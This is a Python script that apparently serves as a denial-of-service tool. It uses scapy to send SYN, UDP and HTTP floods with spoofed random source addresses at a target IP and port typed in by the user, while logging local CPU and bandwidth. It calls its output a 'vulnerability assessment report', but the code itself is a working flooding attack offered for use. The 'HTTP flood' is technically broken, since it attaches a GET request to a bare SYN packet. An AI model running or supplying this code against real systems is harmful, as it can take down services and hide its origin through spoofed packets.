"""
~Developed by JIVITESH
~Written in python3
~Library used like [scapy, psutil]
"""
import scapy.all as scapy
import os
import time
import random
import psutil
from threading import Thread

#for CPU Monitor
def monitor_system_metrics(duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        cpu_usage = psutil.cpu_percent(interval=1)
        network_info = psutil.net_io_counters()
        bandwidth_usage = (network_info.bytes_sent + network_info.bytes_recv) / (1024 * 1024)
        print(f"CPU Usage: {cpu_usage}% | Bandwidth Usage: {bandwidth_usage:.2f} MB")
        time.sleep(1)

#for SYN Flood attack
def syn_flood_attack(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        ip_layer = scapy.IP(src=scapy.RandIP(), dst=target_ip)
        tcp_layer = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
        packet = ip_layer / tcp_layer
        scapy.send(packet, verbose=False)
    print("SYN Flood attack completed.")
#for UDP Flood attack
def udp_flood_attack(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        ip_layer = scapy.IP(src=scapy.RandIP(), dst=target_ip)
        udp_layer = scapy.UDP(dport=target_port, sport=random.randint(1024, 65535))
        payload = random._urandom(1024)  # Random data
        packet = ip_layer / udp_layer / payload
        scapy.send(packet, verbose=False)
    print("UDP Flood attack completed.")

#for HTTP Flood attack
def http_flood_attack(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        ip_layer = scapy.IP(src=scapy.RandIP(), dst=target_ip)
        tcp_layer = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags="S")
        http_request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
        packet = ip_layer / tcp_layer / http_request
        scapy.send(packet, verbose=False)
    print("HTTP Flood attack completed.")

#launch DDoS attacks
def launch_ddos_attacks(target_ip, target_port, attack_type, duration):
    print(f"Launching {attack_type} attack on {target_ip}:{target_port} for {duration} seconds...")


    monitor_thread = Thread(target=monitor_system_metrics, args=(duration,))
    monitor_thread.start()


    if attack_type == "SYN":
        syn_flood_attack(target_ip, target_port, duration)
    elif attack_type == "UDP":
        udp_flood_attack(target_ip, target_port, duration)
    elif attack_type == "HTTP":
        http_flood_attack(target_ip, target_port, duration)
    
    monitor_thread.join()
    print(f"{attack_type} attack finished.")

#generate report
def generate_report(target_ip, attack_type, duration):
    report = f"""
    DDoS Vulnerability Assessment Report
    ------------------------------------
    Target IP: {target_ip}
    Attack Type: {attack_type}
    Duration: {duration} seconds
    Result: Check system metrics and logs for performance impact.
    """
    print(report)
    with open("ddos_report.txt", "w") as report_file:
        report_file.write(report)


if __name__ == "__main__":

    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port (e.g., 80 for HTTP): "))
    attack_type = input("Enter attack type (SYN, UDP, HTTP): ").upper()
    duration = int(input("Enter attack duration (in seconds): "))


    launch_ddos_attacks(target_ip, target_port, attack_type, duration)


    generate_report(target_ip, attack_type, duration)
